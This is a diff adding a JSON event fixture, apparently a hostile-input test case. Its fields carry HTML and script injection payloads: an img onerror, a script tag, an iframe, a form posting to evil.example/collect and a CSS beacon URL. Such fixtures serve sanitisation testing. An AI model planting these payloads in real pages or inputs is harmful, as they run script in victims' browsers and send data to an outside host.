@@ -1,0 +1,19 @@
+{
+  "event_id": "evt_hostile_1",
+  "version": 1,
+  "project_id": "prj_p017",
+  "work_package_id": "wp_p017",
+  "session_id": "ses_p017",
+  "actor_id": "actor<img src=x onerror=alert(1)>",
+  "event_type": "note<form action=http://evil.example/collect>",
+  "occurred_at": "2026-07-19T10:00:00+07:00",
+  "observed_fact": {
+    "note": "<script>alert(1)</script>",
+    "beacon": "<iframe src=http://evil.example></iframe>",
+    "style": "background:url(http://evil.example/pixel)"
+  },
+  "source": "hostile-writer",
+  "idempotency_key": "idem_hostile_1",
+  "classification": "INTERNAL",
+  "content_hash": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
+}
